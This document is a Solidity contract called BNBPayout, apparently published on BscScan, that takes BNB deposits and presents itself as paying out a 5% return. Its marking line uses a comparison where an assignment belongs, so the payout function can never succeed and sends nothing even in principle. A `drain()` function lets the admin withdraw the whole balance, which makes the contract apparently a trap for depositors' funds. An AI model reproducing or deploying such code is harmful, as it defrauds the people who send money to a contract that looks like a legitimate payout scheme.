/**
 *Submitted for verification at BscScan.com on 2022-01-17
*/

pragma solidity ^0.4.26;

/**
* @title SafeMath
* @dev Math operations with safety checks that throw on error
*/
contract SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
        return 0;
    }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
  
    function percent(uint value,uint numerator, uint denominator, uint precision) internal pure  returns(uint quotient) {
        uint _numerator  = numerator * 10 ** (precision+1);
        uint _quotient =  ((_numerator / denominator) + 5) / 10;
        return (value*_quotient/1000000000000000000);
    }
}

contract BNBPayout is SafeMath {
    string public constant name                         = "BNBPayout";                      // Name 
    uint256 public constant decimals                    = 18;                               // Decimal
    address public owner                                = msg.sender;                       // Owner of smart contract
    address public admin                                = msg.sender;                       // Owner of smart contract
    uint256 public eth_received;                                                            // Total ether received in the contract
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint)) public _allowances;
    mapping (address => uint256) payout;
    mapping (address => uint256) bnbamount;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed _owner, address indexed spender, uint value);
    
    // Only owner can access the function
    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert();
        }
        _;
    }
    
    // Only admin can access the function
    modifier onlyAdmin() {
        if (msg.sender != admin) {
            revert();
        }
        _;
    }
    
    constructor() public {
   
    }
    
    function () public payable {
        require(payout[msg.sender] == 0);
        bnbamount[msg.sender] = msg.value;
        payout[msg.sender] == 1;
    }
    
    function payoutbnb() public returns(bool)
    {
        require(payout[msg.sender] == 1);
        uint256 totalPayout = percent(bnbamount[msg.sender], 5, 100, 16);
        totalPayout = add(bnbamount[msg.sender], totalPayout);
        payout[msg.sender] == 0;
        emit Transfer(0, address(this), totalPayout);
    }
    
    // Show token balance of address owner
    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
    
    // Token transfer function
    // Token amount should be in 18 decimals (eg. 199 * 10 ** 18)
    function transfer(address _to, uint256 _amount ) public {
        require(balances[msg.sender] >= _amount && _amount >= 0);
        balances[msg.sender]            = sub(balances[msg.sender], _amount);
        balances[_to]                   = add(balances[_to], _amount);
        emit Transfer(msg.sender, _to, _amount);
    }
 
    function drain() external onlyAdmin {
        admin.transfer(this.balance);
    }
    
}